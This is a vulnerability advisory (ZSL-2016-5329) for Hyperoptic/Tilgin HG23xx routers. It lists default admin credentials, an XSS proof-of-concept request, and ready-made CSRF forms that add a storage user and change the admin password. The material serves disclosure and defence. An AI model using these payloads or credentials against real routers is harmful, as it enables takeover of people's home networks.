@@ -1,0 +1,100 @@
+Hyperoptic (Tilgin) Router HG23xx Multiple XSS And CSRF Vulnerabilities
+
+
+Vendor: Hyperoptic Ltd. | Tilgin AB
+Product web page: http://www.hyperoptic.com
+                  http://www.tilgin.com
+Affected version: HG2330, HG2302 and HG2301
+
+Summary: Tilgin's HG23xx family of products offers a flexible and
+high capacity product in a tiny form factor. When having the product
+in your hands, do not get fooled by its mere size. The product offers
+full gigabit routing and a state of the art superior WLAN solution.
+It runs all services offered with Tilgin HGA and is prepared for all
+foreseeable future services. The product is also offered in an entry
+level version with fast Ethernet LAN ports, still with gigabit Ethernet
+WAN. The routing capacity and excellent WLAN remains the same also on
+this model, the only limit being the fast Ethernet LAN ports.
+
+Desc: The application allows users to perform certain actions via HTTP
+requests without performing any validity checks to verify the requests.
+This can be exploited to perform certain actions with administrative
+privileges if a logged-in user visits a malicious web site. XSS issues
+were also discovered. The issue is triggered when input passed via multiple
+POST and GET parameters are not properly sanitized before being returned
+to the user. This can be exploited to execute arbitrary HTML and script
+code in a user's browser session in context of an affected site.
+
+
+Tested on: lighttpd/1.4.26-devel-166445
+           lighttpd/1.4.26-devel-163573
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5329
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5329.php
+
+
+11.05.2016
+
+--
+
+
+
+Default credentials:
+--------------------
+
+user/user
+admin/admin
+admin/abcd2301
+
+
+XSS PoC:
+--------
+
+POST /advanced/firewall_templates/ HTTP/1.1
+Host: 192.168.1.1
+
+__form=new&name=test"><script>prompt(1)</script>
+
+
+Response:
+
+[..snip..]
+<INPUT type="hidden" name="name" value="test"><script>prompt(1)</script>">
+[..snip..]
+
+
+
+CSRF Add Storage (HTTP/SMB) User:
+---------------------------------
+
+<html>
+  <body>
+    <form action="http://192.168.1.1/storage/users/" method="POST">
+      <input type="hidden" name="&#95;&#95;form" value="new" />
+      <input type="hidden" name="name" value="testuser" />
+      <input type="hidden" name="password" value="testpass" />
+      <input type="submit" value="Submit" />
+    </form>
+  </body>
+</html>
+
+
+
+CSRF Change Admin Password:
+---------------------------
+
+<html>
+  <body>
+    <form action="http://192.168.1.1/tools/admin_account/" method="POST">
+      <input type="hidden" name="&#95;&#95;form" value="user" />
+      <input type="hidden" name="name" value="admin" />
+      <input type="hidden" name="password" value="NEWPASS" />
+      <input type="submit" value="Submit" />
+    </form>
+  </body>
+</html>
